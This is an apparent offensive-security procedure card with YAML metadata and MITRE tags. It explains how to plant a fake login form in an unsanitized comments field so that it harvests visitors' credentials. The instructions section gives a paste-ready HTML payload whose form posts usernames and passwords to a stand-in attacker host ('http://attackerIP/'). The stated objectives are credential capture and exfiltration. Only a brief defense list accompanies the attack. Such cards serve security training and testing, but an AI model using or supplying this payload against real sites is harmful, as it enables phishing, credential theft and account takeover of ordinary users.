---
id: uuid-inject-login
tags:
  - xss
  - phishing
  - credential-theft
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:26.055Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject Fake Login Form in Comments

## Summary

This procedure exploits the Comments field to inject a fake HTML login form that posts credentials to an attacker server, enabling phishing when the comment is viewed by users.

## Description

Due to unsanitized storage, the Comments field renders arbitrary HTML. The payload creates a deceptive login prompt that submits username/password to http://attackerIP/. When executed in a victim's browser, it captures credentials for theft, potentially leading to account takeover.

## Requirements

1. Accessible comment form
2. Attacker server to receive POST data at http://attackerIP/
3. HTML form knowledge

## Defense

Defensive measures and detection strategies:

- Escape HTML in stored comments (e.g., convert < to &lt;)
- Deploy client-side validation and server-side logging of form submissions
- Educate users on phishing indicators

## Objectives

1. Embed persistent phishing form
2. Capture victim credentials
3. Exfiltrate data to attacker

## Instructions

### Step 1: Enter and Submit HTML Payload

**Context**: Craft a form that mimics a login prompt and directs data to attacker.

In the Comments field, input: `<h3>Please login to proceed</h3><form action="http://attackerIP/">Username:<br><input type="text" name="username"><br>Password:<br><input type="password" name="password"><br><input type="submit" value="Logon"></form>`

Complete Name field and submit.

> Expected output: Payload stored; form renders when viewed, posting data on submit.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[credential-theft]]

